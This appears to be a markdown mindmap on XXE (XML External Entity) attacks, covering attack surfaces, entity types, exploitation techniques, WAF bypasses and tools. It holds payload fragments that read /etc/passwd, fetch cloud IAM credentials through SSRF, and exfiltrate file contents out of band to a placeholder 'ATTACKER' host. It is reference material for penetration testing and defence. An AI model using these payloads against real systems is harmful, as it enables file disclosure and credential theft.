# XXE (XML External Entity) — Mindmap

## Attack Surface
- XML parsers: SOAP, REST-XML, SAML, RSS, SVG, DOCX/XLSX/PPTX (zip+XML), PDF generators
- File upload accepting XML-derived formats
- SSRF-adjacent: any server-side XML parsing with DTD enabled

## Entity Types
- **Internal entity**: `<!ENTITY xxe "value">` — in-band substitution
- **External entity**: `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — file read
- **Parameter entity**: `<!ENTITY % xxe SYSTEM "...">` — used in DTD, OOB chains
- **General entity**: referenced with `&entity;` in the document body

## Exploitation Techniques
- **File disclosure**: `SYSTEM "file:///etc/passwd"`, `php://filter/convert.base64-encode/resource=index.php`
- **SSRF via XXE**: `SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
- **OOB exfiltration (blind XXE)**: attacker DTD + FTP/HTTP listener
  - `<!ENTITY % file SYSTEM "file:///etc/hostname">`
  - `<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>">`
- **Error-based XXE**: force parser error containing file content
- **DoS**: Billion Laughs (entity expansion), Quadratic Blowup
- **XInclude**: `<xi:include parse="text" href="file:///etc/passwd"/>` when DOCTYPE is blocked

## Bypasses
- UTF-16 / UTF-7 encoding to evade WAF signatures
- CDATA sections to break out of text nodes
- `jar:`, `gopher://`, `netdoc://` protocol handlers
- Base64-encoded DTD fetched from remote server

## Tools
- Burp Suite (Collaborator for OOB), XXEinjector, oxml_xxe, DTD-fetch servers
